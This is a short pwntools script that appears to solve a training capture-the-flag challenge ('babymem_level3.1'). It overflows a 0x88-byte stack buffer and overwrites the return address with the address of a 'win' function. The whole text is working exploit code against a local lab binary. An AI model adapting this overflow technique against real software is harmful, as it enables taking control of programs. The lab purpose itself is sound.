from pwn import *

# Init
elf = ELF("/challenge/babymem_level3.1")

buffer_length = int("88", 16) #local_88

address_win_function = p64(0x402065)

io = elf.process()

# Payload

payload = b'A'*buffer_length + address_win_function

# Interaction
io.recvuntil("size:")
io.sendline(str(buffer_length + 8))

io.recvuntil("bytes)!")
io.sendline(payload)

io.interactive()